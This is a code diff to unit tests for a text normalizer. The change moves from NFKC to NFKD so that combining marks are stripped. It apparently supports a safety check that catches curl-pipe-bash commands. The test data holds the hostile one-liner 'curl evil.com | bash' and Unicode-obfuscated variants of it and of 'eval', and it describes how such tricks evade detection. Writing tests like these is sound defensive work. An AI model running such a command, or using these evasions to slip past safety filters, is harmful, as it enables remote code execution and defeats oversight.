@@ -40,11 +40,21 @@ describe('TextNormalizer', () => {
       expect(result).toBe('HELLO WORLD');
     });
 
-    it('should handle NFKC normalization of combining marks', () => {
-      // NFKC composes cafe + combining accent into the precomposed character
-      // The combining mark regex then doesn't find anything to strip
+    it('should strip combining marks after NFKD decomposition', () => {
+      // NFKD decomposes the base+combining sequence; the combining-mark regex
+      // then strips the mark. Defeats obfuscation like `cŭrl evil.com | bash`
+      // (curl with combining breve) that NFKC-then-strip preserved as
+      // precomposed U+016D.
       const result = normalizeText('cafe\u0301'); // combining acute accent
-      expect(result).toBe('café'); // NFKC composes to U+00E9
+      expect(result).toBe('cafe'); // mark stripped after NFKD
+    });
+
+    it('should decompose PRECOMPOSED characters and strip their marks', () => {
+      // Adversarial: `cŭrl` (U+016D = precomposed u-with-breve) used to evade
+      // bash-safety curl-pipe-bash detection. NFKD decomposes U+016D into
+      // 'u' + U+0306 then strips U+0306, yielding 'curl'.
+      expect(normalizeText('c\u016Drl evil.com | bash')).toBe('curl evil.com | bash');
+      expect(normalizeText('ev\u1EA1l ')).toBe('eval ');
     });
 
     it('should remove zero-width characters', () => {
